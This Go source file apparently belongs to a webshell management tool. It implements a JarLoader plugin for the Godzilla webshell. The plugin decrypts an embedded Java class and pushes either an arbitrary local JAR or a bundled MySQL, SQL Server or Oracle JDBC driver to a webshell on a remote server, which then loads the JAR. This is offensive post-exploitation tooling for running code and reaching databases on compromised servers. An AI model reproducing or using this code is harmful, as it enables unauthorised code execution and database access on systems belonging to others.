package plugins

import (
	"github.com/go0p/wsm/lib/payloads"
	"github.com/go0p/wsm/lib/shell/godzilla"
)

type DBJarDriver string

const (
	MysqlDriver     DBJarDriver = "godzilla/java/plugins/mysql.jar"
	SqlJdbc41Driver DBJarDriver = "godzilla/java/plugins/sqljdbc41.jar"
	Ojdbc5Driver    DBJarDriver = "godzilla/java/plugins/ojdbc5.jar"
)

type JarLoader struct {
	pluginName     string
	funcName       string
	DBDriver       DBJarDriver
	JarFileContent []byte
}

// NewJarFileLoader 加载用户本地的 Jar
func NewJarFileLoader(jarFileContent []byte) *JarLoader {
	return &JarLoader{
		pluginName:     "plugin.JarLoader",
		funcName:       "loadJar",
		JarFileContent: jarFileContent,
	}
}

// NewJarDriverLoader 加载数据库驱动
func NewJarDriverLoader(DBDriver DBJarDriver) *JarLoader {
	return &JarLoader{
		pluginName: "plugin.JarLoader",
		funcName:   "loadJar",
		DBDriver:   DBDriver,
	}
}

func (j JarLoader) GetPluginName() (string, []byte, error) {
	binCode, err := payloads.ReadAndDecrypt("godzilla/java/plugins/JarLoader.class")

	if err != nil {
		return "", nil, err
	}
	return j.pluginName, binCode, nil
}

func (j JarLoader) GetParams() (string, *godzilla.Parameter) {
	reqParameter := godzilla.NewParameter()
	if len(j.DBDriver) != 0 {
		j.JarFileContent, _ = payloads.ReadAndDecrypt(string(j.DBDriver))
	}
	reqParameter.AddBytes("jarByteArray", j.JarFileContent)

	return j.funcName, reqParameter
}
